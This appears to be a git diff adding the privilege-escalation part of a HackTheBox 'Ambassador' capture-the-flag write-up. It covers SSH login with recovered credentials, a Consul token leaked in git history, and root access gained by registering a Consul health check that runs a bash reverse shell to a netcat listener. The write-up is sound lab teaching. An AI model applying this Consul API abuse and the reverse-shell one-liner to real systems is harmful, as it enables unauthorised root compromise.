@@ -370,7 +370,7 @@ here's a list of the database i found by executing the command `show databases;`
 +--------------------+
 ```
 
-Here we find an intresting database called `whackywidget` in which we find a base64 encoded password that we will later use for ssh 
+Here we find an intresting database called `whackywidget` in which we find a base64 encoded password that we will later use for ssh.
 
 ```
 +-----------+------------------------------------------+
@@ -379,3 +379,189 @@ Here we find an intresting database called `whackywidget` in which we find a bas
 | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
 +-----------+------------------------------------------+
 ```
+
+We can now login to ssh with:
+
+`developer:anEnglishManInNewYork027468`
+
+## SSH as developer
+
+as always, i'll start my enumeration by doing some basic checks, and running linpeas.
+
+here's some intresting things i found:
+
+```
+╔══════════╣ Unexpected in /opt (usually empty)
+total 16
+drwxr-xr-x  4 root   root   4096 Sep  1 22:13 .
+drwxr-xr-x 20 root   root   4096 Sep 15 17:24 ..
+drwxr-xr-x  4 consul consul 4096 Mar 13  2022 consul
+drwxrwxr-x  5 root   root   4096 Mar 13  2022 my-app
+
+```
+
+```bash
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+
+```
+
+by simply looking at the files in /opt folder, we can see that the server is running **hashicorp consul** (on port `8500`).
+
+> HashiCorp Consul is a service networking solution that enables teams to manage secure network connectivity between services and across on-prem and multi-cloud environments and runtimes.
+{: .prompt-info }
+
+
+At first i wasn't sure that this could be a privesc vector, but after a quick process check (`ps aux | grep consul`) i had no doubt left.
+
+```bash
+developer@ambassador:/opt/my-app$ ps aux | grep consul
+root        1084  0.3  3.9 795572 78628 ?        Ssl  Oct07   2:26 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
+```
+
+consul was running as root!
+
+Addtionally, in the developer's home i found this intresting script that indeed specified they ran consul:
+
+```bash
+developer@ambassador:/opt/my-app/whackywidget$ cat put-config-in-consul.sh 
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+```
+
+This meant that they were probably using a **CONSUL_HTTP_TOKEN** as a "password". 
+
+I also found a .gitconfig file containing the path to an application we saw earlier. /opt/my-app that contains a .git directory, let's enumerate it!
+
+```yaml
+[user]
+	name = Developer
+	email = developer@ambassador.local
+[safe]
+	directory = /opt/my-app
+```
+
+> always check the logs of a git directory, it could leak some intresting informations!
+{: .prompt-tip }
+
+```bash
+developer@ambassador:/opt/my-app$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:44:45 2022 +0000
+
+    config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+new file mode 100755
+index 0000000..35c08f6
+--- /dev/null
++++ b/whackywidget/put-config-in-consul.sh
+@@ -0,0 +1,4 @@
++# We use Consul for application config in production, this script will help set the correct values for the app
++# Export MYSQL_PASSWORD before running
++
++consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+```
+
+And there it is! The consul access token! `bb03b43b-1d81-d62b-24b5-39540ee469b5` 
+
+With this, i was able to actually able to authenticate with a tool called `consul` (who would have guessed...) by exporting the token as a environment variable:
+
+`export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5`
+
+we can now list tokens!
+
+```bash
+└──╼ $consul acl token list
+AccessorID:       00000000-0000-0000-0000-000000000002
+Description:      Anonymous Token
+Local:            false
+Create Time:      2022-03-13 23:14:16.941144142 +0000 UTC
+Legacy:           false
+
+AccessorID:       2aae5590-4b99-3b3d-56d9-71b61ee9e744
+Description:      Bootstrap Token (Global Management)
+Local:            false
+Create Time:      2022-03-13 23:14:25.977142971 +0000 UTC
+Legacy:           false
+Policies:
+   00000000-0000-0000-0000-000000000001 - global-management
+
+```
+
+Now, we can try to get rce by registering a health check on consul.
+
+I was able to do it after a bit of googling that lead to these links here
+
+[https://www.consul.io/docs/discovery/checks](https://www.consul.io/docs/discovery/checks)
+
+[https://www.consul.io/commands/services/register](https://www.consul.io/commands/services/register)
+
+[(https://discuss.hashicorp.com/t/get-error-unexpected-response-code-400-invalid-check-ttl-must-be-0-for-ttl-checks-when-register-service-with-args-check/34215/2](https://discuss.hashicorp.com/t/get-error-unexpected-response-code-400-invalid-check-ttl-must-be-0-for-ttl-checks-when-register-service-with-args-check/34215/2)
+
+Where, by copying an example from the last one i was able to get code execution and privescalate to root :)
+
+
+rev.json:
+
+```json
+{
+  "name": "rvsh",
+  "tags": [
+    "default"
+  ],
+  "checks": [
+    {
+      "name": "args_check",
+      "args": [
+        "/tmp/.nightmare/rev.sh"
+      ],
+      "interval": "10s",
+      "timeout": "100s"
+    }
+  ]
+}
+```
+
+/tmp/.nightmare/rev.sh
+
+```bash
+/bin/bash -i >& /dev/tcp/ip/1234 0>&1
+```
+
+`$ curl --request PUT --data @rev.json http://127.0.0.1:8500/v1/agent/service/register`
+
+and after 10 seconds i got a shell back to my netcat listener!! (`nc -lnvp 1234`).
+
+Done!
+
+```
+root@ambassador:/root# id
+
+uid=0(root) gid=0(root) gruppi=0(root)
+```
+
+## epilogue
+
+I hope this information is helpful. I found this challenge from htb VERY interesting and really enjoyed working on it. It is truly deserving of its 4.5-star rating.
+
+**Also for the privilege escalation, a script made by gatogamer1155 has come out, here's the link if you want to check it out! [https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)**
+
+A big thank you to [DirectRoot](https://app.hackthebox.com/users/24906) for creating such an engaging and rewarding experience :)
+
+![thank-you-for-reading!](https://www.candidcandace.com/.a/6a00e554550884883301a511de7fad970c-800wi)
